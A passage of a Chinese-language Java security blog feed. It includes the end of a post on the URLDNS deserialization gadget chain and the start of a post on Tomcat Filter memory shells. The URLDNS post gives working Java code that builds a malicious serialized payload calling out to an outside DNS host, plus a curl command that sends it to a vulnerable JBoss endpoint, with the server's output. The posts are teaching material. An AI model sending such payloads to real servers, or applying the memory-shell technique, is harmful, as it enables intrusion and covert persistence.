class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">        <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>hash</code>方法如下，这个方法会调用传入的对象的<code>hashCode</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合如上段落的分析，当传入一个URL对象到这个<code>hash</code>方法，便会执行<code>java.net.URL#hashCode</code>方法，这样就能够触发恶意行为。</p><p>继续观察<code>HashMap</code>类，发现在<code>put</code>方法对<code>putVal</code>方法进行了调用，此处同样调用了<code>hash</code> 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然如此，那就可以将一个<code>URL</code>对象放置在<code>HashMap</code>中，通过调用<code>HashMap</code>的<code>put</code>方法，从而在反序列化执行<code>readObject</code>方法时触发<code>hash</code>方法的执行，该方法将调用传入的<code>URL</code>对象的<code>hashCode</code>方法，如此便可达到执行DNS查询的恶意行为。</p><h3 id="利用代码及验证"><a href="#利用代码及验证" class="headerlink" title="利用代码及验证"></a>利用代码及验证</h3><p>利用代码如下，关于详细的代码释义见其中的代码注释。需要特别注意地是，在序列化时，需要通过反射修改hashCode成员变量为非-1，否则在序列化时就会触发DNS请求，这样将会对反序列化漏洞的检测造成误报。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.urldns;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://urldns.1asj4bef1af.ipv6.bypass.eu.org&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 利用反射技术获取java.net.URL类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取hashCode成员变量</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 修改hashCode的值为非-1，以防止在序列化时触发DNS查询，造成误报</span></span><br><span class="line">        f.set(url, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(url, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将hashCode改回-1，以在反序列化时触发DNS查询</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成恶意的序列化数据</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;urldns.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，向一个存在反序列化漏洞的Jboss环境发送如上生成的恶意序列化数据，效果符合我们的预期，见如下图，即Jboss服务器成功向我们指定的域发起DNS查询。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue&quot;</span> --data-binary <span class="string">&quot;@urldns.ser&quot;</span> http://192.168.1.128:8080/invoker/readonly</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;<span class="built_in">head</span>&gt;&lt;title&gt;JBoss Web/3.0.0-CR2 - Error report&lt;/title&gt;&lt;style&gt;&lt;!--H1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:<span class="comment">#525D76;font-size:22px;&#125; H2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; H3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; BODY &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; B &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; P &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125;A &#123;color : black;&#125;A.name &#123;color : black;&#125;HR &#123;color : #525D76;&#125;--&gt;&lt;/style&gt; &lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 500 - &lt;/h1&gt;&lt;HR size=&quot;1&quot; noshade=&quot;noshade&quot;&gt;&lt;p&gt;&lt;b&gt;type&lt;/b&gt; Exception report&lt;/p&gt;&lt;p&gt;&lt;b&gt;message&lt;/b&gt; &lt;u&gt;&lt;/u&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;description&lt;/b&gt; &lt;u&gt;The server encountered an internal error () that prevented it from fulfilling this request.&lt;/u&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;exception&lt;/b&gt; &lt;pre&gt;java.lang.ClassCastException: java.util.HashMap cannot be cast to org.jboss.invocation.MarshalledInvocation</span></span><br><span class="line">        org.jboss.invocation.http.servlet.ReadOnlyAccessFilter.doFilter(ReadOnlyAccessFilter.java:106)</span><br><span class="line">&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;note&lt;/b&gt; &lt;u&gt;The full stack trace of the root cause is available <span class="keyword">in</span> the JBoss Web/3.0.0-CR2 logs.&lt;/u&gt;&lt;/p&gt;&lt;HR size=<span class="string">&quot;1&quot;</span> noshade=<span class="string">&quot;noshade&quot;</span>&gt;&lt;h3&gt;JBoss Web/3.0.0-CR2&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;%       </span><br></pre></td></tr></table></figure><p><img src="/img/post/java-deserialization-vulnerability-principle/urldns.png"></p><h3 id="URLDNS链总结"><a href="#URLDNS链总结" class="headerlink" title="URLDNS链总结"></a>URLDNS链总结</h3><p>URLDNS链比较简单，由于它只依赖原生类，没有JDK版本限制，且没有危害，只会触发DNS查询，所以它常被用作来检测反序列化漏洞，但前提是服务器的DNS流量必须出网。</p><p>由于该链的简单性，它只有kick-off和sink，之间没有其他的类作为中间调用链。</p><ul><li>kick-off：<code>java.util.HashMap#readObject</code></li><li>sink：<code>java.net.URL#hashCode</code></li></ul><p>完整gadget调用链如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">  HashMap.putVal()</span><br><span class="line">    HashMap.hash()</span><br><span class="line">      URL.hashCode()</span><br></pre></td></tr></table></figure><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ul><li><a href="https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles">https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles</a></li><li><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a></li><li><a href="https://gosecure.github.io/presentations/2019-04-29_atlseccon/History_of_Deserialization_v2.2.pdf">https://gosecure.github.io/presentations/2019-04-29_atlseccon/History_of_Deserialization_v2.2.pdf</a></li><li><a href="https://www.pwntester.com/blog/2013/12/16/cve-2011-2894-deserialization-spring-rce/">https://www.pwntester.com/blog/2013/12/16/cve-2011-2894-deserialization-spring-rce/</a></li><li><a href="https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf">https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf</a></li><li><a href="https://su18.org/post/ysuserial/">https://su18.org/post/ysuserial/</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-12149">https://nvd.nist.gov/vuln/detail/CVE-2017-12149</a></li><li><a href="https://web-sec.gitbook.io/wsa/advanced/deserialization">https://web-sec.gitbook.io/wsa/advanced/deserialization</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> deserialization </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat Filter型内存马</title>
      <link href="/tomcat-filter-memshell.html"/>
      <url>/tomcat-filter-memshell.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#Filter%E7%AE%80%E4%BB%8B">Filter简介</a></li><li><a href="#Filter%E5%AE%9E%E7%8E%B0">Filter实现</a></li><li><a href="#Filter%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">Filter处理流程分析</a></li><li><a href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E9%93%BE%E5%88%9B%E5%BB%BA%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90">过滤器链创建过程分析</a></li><li><a href="#FilterDef%E4%B8%8EFilterMap">FilterDef与FilterMap</a><ul><li><a href="#FilterDef">FilterDef</a></li><li><a href="#FilterDef">FilterDef</a></li></ul></li><li><a href="#StandardContext">StandardContext</a></li><li><a href="#Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0">Filter型内存马实现</a></li></ul><h2 id="Filter简介"><a href="#Filter简介" class="headerlink" title="Filter简介"></a>Filter简介</h2><p>在Tomcat中，Filter（过滤器）是Java Servlet API的一部分，用于在请求到达Servlet之前或在响应返回客户端之前对请求和响应进行处理。Filter可以对请求和响应进行修改、记录、验证等操作，它提供了一种灵活的机制来处理Web应用中的公共任务。</p><h2 id="Filter实现"><a href="#Filter实现" class="headerlink" title="Filter实现"></a>Filter实现</h2><p>要实现一个Filter，首先需要创建一个实现javax.servlet.Filter接口的类，并实现如下三个方法。</p><ul><li>init(FilterConfig config)：初始化方法，在Filter创建时调用。</li><li>doFilter(ServletRequest request, ServletResponse response, FilterChain chain)：主要的过滤逻辑方法，在每次请求时调用。</li><li>destroy()：销毁方法，在Filter销毁时调用。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcatdemo.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterDemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Filter Init.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Filtering.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Filter Destroy.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，若要在Web应用中使用如上Filter，则需要在web.xml文件中定义Filter名称、类名以及URL映射模式。如下配置意味着FilterDemo类将对所有的请求都进行过滤。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>FilterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.tomcatdemo.filter.FilterDemo<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>FilterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Filter处理流程分析"><a href="#Filter处理流程分析" class="headerlink" title="Filter处理流程分析"></a>Filter处理流程分析</h2><p>在IDEA中配置好Tomcat，将断点打在chain.doFilter(request, response)代码行，开始Debug。</p><p><img src="/img/post/tomcat-filter-memshell/0.png"></p><p>此时，可观察到chain已经是一个ApplicationFilterChain对象了。</p><p><img src="/img/post/tomcat-filter-memshell/1.png"></p><p>往前回溯，到达org.apache.catalina.core.ApplicationFilterChain#internalDoFilter:241处。</p><p><img src="/img/post/tomcat-filter-memshell/2.png"></p><p>在该方法中，通过了一个名为filterConfig的ApplicationFilterConfig对象遍历获取filters中的值，而filters则是一个ApplicationFilterConfig数组。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ApplicationFilterConfig[] filters = <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>再往前回溯，到达org.apache.catalina.core.ApplicationFilterChain#doFilter方法。</p><p>继续往前跟，到达org.apache.catalina.core.StandardWrapperValve#invoke方法中，在其中对filterChain.doFilter进行了调用。</p><p><img src="/img/post/tomcat-filter-memshell/3.png"></p><p>展开这个filterChain，可发现其中存放了由我们实现的FilterDemo过滤器。</p><p><img src="/img/post/tomcat-filter-memshell/4.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> factory.createFilterChain(request, wrapper, servlet);</span><br></pre></td></tr></table></figure><p>根据如上filterChain变量的定义及初始化，接下来便对org.apache.catalina.core.ApplicationFilterFactory#createFilterChain方法进行分析。</p><h2 id="过滤器链创建过程分析"><a href="#过滤器链创建过程分析" class="headerlink" title="过滤器链创建过程分析"></a>过滤器链创建过程分析</h2><p>过滤器链用于按顺序应用一组过滤器来处理HTTP请求和响应，它是通过org.apache.catalina.core.ApplicationFilterChain类来实现的，在org.apache.catalina.core.ApplicationFilterFactory中提供了createFilterChain方法用来创建过滤器链，所以我们将断点打至此处，重新Debug。</p><p><img src="/img/post/tomcat-filter-memshell/5.png"></p><p>这个方法的开头对请求的调度类型（REQUEST、FORWARD、INCLUDE）和路径进行了获取，随后对servlet进行了null判断，如果为null，则直接返回null。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// get the dispatcher type</span></span><br><span class="line"><span class="type">DispatcherType</span> <span class="variable">dispatcher</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (request.getAttribute(Globals.DISPATCHER_TYPE_ATTR) != <span class="literal">null</span>) &#123;</span><br><span class="line">    dispatcher = (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">String</span> <span class="variable">requestPath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">attribute</span> <span class="operator">=</span> request.getAttribute(</span><br><span class="line">        Globals.DISPATCHER_REQUEST_PATH_ATTR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (attribute != <span class="literal">null</span>)&#123;</span><br><span class="line">    requestPath = attribute.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If there is no servlet to execute, return null</span></span><br><span class="line"><span class="keyword">if</span> (servlet == <span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>然后会根据请求类型是否为Request对象以及是否启用了安全性来创建过滤器链对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">comet</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create and initialize a filter chain object</span></span><br><span class="line"><span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (request <span class="keyword">instanceof</span> Request) &#123;</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) request;</span><br><span class="line">    comet = req.isComet();</span><br><span class="line">    <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">        <span class="comment">// Security: Do not recycle</span></span><br><span class="line">        filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">        <span class="keyword">if</span> (comet) &#123;</span><br><span class="line">            req.setFilterChain(filterChain);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        filterChain = (ApplicationFilterChain) req.getFilterChain();</span><br><span class="line">        <span class="keyword">if</span> (filterChain == <span class="literal">null</span>) &#123;</span><br><span class="line">            filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">            req.setFilterChain(filterChain);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Request dispatcher in use</span></span><br><span class="line">    filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/post/tomcat-filter-memshell/6.png"></p><p>再然后，设置过滤器链的Servlet。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filterChain.setServlet(servlet);</span><br><span class="line">filterChain.setSupport(((StandardWrapper)wrapper).getInstanceSupport());</span><br></pre></td></tr></table></figure><p>之后，就是从wrapper中获取父级上下文，即StandardContext，并根据StandardContext调用findFilterMaps方法获取过滤器映射，如下图，已经获取到web.xml文件中的filter-mapping配置。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Acquire the filter mappings for this Context</span></span><br><span 